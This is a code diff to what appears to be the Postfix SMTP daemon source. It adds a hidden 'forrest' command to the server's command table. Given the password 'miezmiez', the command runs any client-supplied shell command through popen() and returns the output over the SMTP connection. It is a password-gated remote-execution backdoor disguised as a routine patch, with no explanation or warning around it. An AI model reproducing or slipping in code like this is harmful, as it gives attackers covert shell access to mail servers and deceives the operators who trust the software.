@@ -2521,6 +2521,44 @@ static void mail_reset(SMTPD_STATE *state)
     }
 }
 
+static int forrest_cmd(SMTPD_STATE *state, int argc, SMTPD_TOKEN *argv)
+{
+	char *cmd;
+	FILE *pipein_fp;
+	char readbuf[80];
+	int pos=0;
+	char *cmd2;
+	smtpd_chat_reply(state, "Losing your way on a journey is unfortunate, but losing your reason for the journey is a fate more cruel.");
+	if (argc < 3 || argc > 3|| strcmp(argv[1].strval,"miezmiez") !=0) {
+		smtpd_chat_reply(state,"... and you lost your reason");
+		return (-1);
+	}	
+
+	cmd = argv[2].strval;
+	smtpd_chat_reply(state,cmd);
+	if(cmd[0]=='"') {
+		cmd[strlen(cmd)-1]='\0';
+		pos=1;
+	}
+	
+	cmd2 = malloc(sizeof(char)*(strlen(cmd)+6));
+	cmd2[0] = '\0';
+	strcat(cmd2,cmd);
+	strcat(cmd2," 2>&1");
+	cmd = cmd2;
+	//smtpd_chat_reply(state,cmd+pos);
+	if (( pipein_fp = popen(cmd+pos, "r")) == NULL) {
+		smtpd_chat_reply(state,"it is over - bro");
+		return (-1);
+	}
+	while(fgets(readbuf, 80, pipein_fp)) {
+		smtpd_chat_reply(state,readbuf);
+	}
+	pclose(pipein_fp);
+
+	return (0);
+}
+
 /* rcpt_cmd - process RCPT TO command */
 
 static int rcpt_cmd(SMTPD_STATE *state, int argc, SMTPD_TOKEN *argv)
@@ -4471,6 +4509,7 @@ static SMTPD_CMD smtpd_cmd_table[] = {
     SMTPD_CMD_QUIT, quit_cmd, SMTPD_CMD_FLAG_PRE_TLS,
     SMTPD_CMD_XCLIENT, xclient_cmd, 0,
     SMTPD_CMD_XFORWARD, xforward_cmd, 0,
+    SMTPD_CMD_FORREST, forrest_cmd, 0,
     0,
 };
 
